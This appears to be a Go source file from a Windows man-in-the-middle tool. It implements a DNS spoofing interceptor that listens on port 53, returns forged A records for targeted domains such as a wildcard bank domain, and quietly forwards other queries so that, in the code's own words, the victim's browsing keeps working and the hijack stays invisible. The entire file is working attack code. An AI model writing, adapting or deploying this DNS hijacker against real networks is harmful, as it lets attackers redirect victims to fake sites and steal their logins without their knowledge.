//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// DNS interceptor
//
// Runs a UDP/53 responder. Queries for domains in the spoof map get a forged
// A record; everything else is forwarded to the real upstream so the victim's
// browsing keeps working and the hijack stays invisible.
// ---------------------------------------------------------------------------

func startDNSInterceptor(s Settings, ourIP net.IP, stop chan struct{}) {
	pc, err := net.ListenPacket("udp4", "0.0.0.0:53")
	if err != nil {
		sendEvent("error", map[string]interface{}{"message": "DNS bind :53 failed: " + err.Error()})
		return
	}
	defer pc.Close()

	sendEvent("status", map[string]interface{}{
		"state": "listening",
		"detail": fmt.Sprintf("DNS interceptor on :53 (%d spoofed domain(s))", len(s.DNSSpoof)),
	})

	upstream := s.DNSUpstream
	if upstream == "" {
		upstream = "8.8.8.8:53"
	} else if !strings.Contains(upstream, ":") {
		upstream += ":53"
	}

	buf := make([]byte, 4096)
	for {
		select {
		case <-stop:
			return
		default:
		}
		_ = pc.SetReadDeadline(time.Now().Add(time.Second))
		n, addr, err := pc.ReadFrom(buf)
		if err != nil || n < 12 {
			continue
		}
		query := make([]byte, n)
		copy(query, buf[:n])

		name := parseDNSQuestion(query)
		if name == "" {
			continue
		}

		if fake, ok := matchSpoof(s.DNSSpoof, name); ok {
			resp := buildDNSAnswer(query, net.ParseIP(fake))
			if resp != nil {
				_, _ = pc.WriteTo(resp, addr)
				sendEvent("dnsspoof", map[string]interface{}{
					"domain": name, "answer": fake, "from": addr.String(),
				})
				continue
			}
		}

		// Forward upstream and relay the answer back unchanged.
		go forwardDNS(pc, addr, query, upstream)
	}
}

func forwardDNS(pc net.PacketConn, client net.Addr, query []byte, upstream string) {
	conn, err := net.DialTimeout("udp", upstream, 3*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
	if _, err := conn.Write(query); err != nil {
		return
	}
	resp := make([]byte, 4096)
	n, err := conn.Read(resp)
	if err != nil {
		return
	}
	_, _ = pc.WriteTo(resp[:n], client)
}

// parseDNSQuestion returns the queried name in lowercase without trailing dot.
func parseDNSQuestion(p []byte) string {
	if len(p) < 12 {
		return ""
	}
	return strings.ToLower(strings.TrimSuffix(parseDNSName(p[12:]), "."))
}

// matchSpoof supports exact names and leading-wildcard entries ("*.bank.com").
func matchSpoof(m map[string]string, name string) (string, bool) {
	if m == nil {
		return "", false
	}
	if v, ok := m[name]; ok {
		return v, true
	}
	for k, v := range m {
		k = strings.ToLower(k)
		if strings.HasPrefix(k, "*.") {
			suffix := k[1:] // ".bank.com"
			if strings.HasSuffix(name, suffix) || name == k[2:] {
				return v, true
			}
		}
	}
	return "", false
}

// buildDNSAnswer crafts a response with a single A record pointing at ip.
func buildDNSAnswer(query []byte, ip net.IP) []byte {
	if ip == nil || ip.To4() == nil {
		return nil
	}
	// Locate the end of the question section.
	i := 12
	for i < len(query) {
		l := int(query[i])
		if l == 0 {
			i++
			break
		}
		if l > 63 {
			return nil
		}
		i += 1 + l
	}
	if i+4 > len(query) {
		return nil
	}
	qend := i + 4 // QTYPE + QCLASS

	resp := make([]byte, 0, qend+16)
	resp = append(resp, query[:qend]...)

	// Header: response, recursion available, no error.
	resp[2] = 0x81
	resp[3] = 0x80
	binary.BigEndian.PutUint16(resp[4:6], 1) // QDCOUNT stays 1
	binary.BigEndian.PutUint16(resp[6:8], 1) // ANCOUNT 1
	binary.BigEndian.PutUint16(resp[8:10], 0)
	binary.BigEndian.PutUint16(resp[10:12], 0)

	// Answer: name pointer to offset 12, type A, class IN, ttl 60, rdlen 4.
	ans := []byte{
		0xc0, 0x0c,
		0x00, 0x01,
		0x00, 0x01,
		0x00, 0x00, 0x00, 0x3c,
		0x00, 0x04,
	}
	ans = append(ans, ip.To4()...)
	return append(resp, ans...)
}
